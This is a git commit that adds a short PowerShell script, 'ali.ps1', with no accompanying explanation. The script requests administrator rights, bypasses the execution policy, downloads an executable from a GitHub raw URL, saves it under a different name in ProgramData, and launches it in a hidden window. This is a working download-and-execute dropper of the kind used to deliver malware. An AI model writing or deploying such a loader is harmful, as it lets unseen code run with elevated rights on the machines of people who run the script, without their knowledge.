0085249e1f3442a7ea71dc11e1ef3feb40d71c4c
AnatolyPivder <149972492+AnatolyPivder@users.noreply.github.com>
2026-05-23 23:48:45 +0000

    Create ali.ps1

---
+++ ali.ps1
@@ -0,0 +1,13 @@
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$url = "https://github.com/AnatolyPivder/Kurbaran_Baraban/raw/refs/heads/main/ali.exe"
+
+$outputPath = "$env:ProgramData\kbm.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
+
+Start-Process -FilePath $outputPath -WindowStyle Hidden
+
+exit
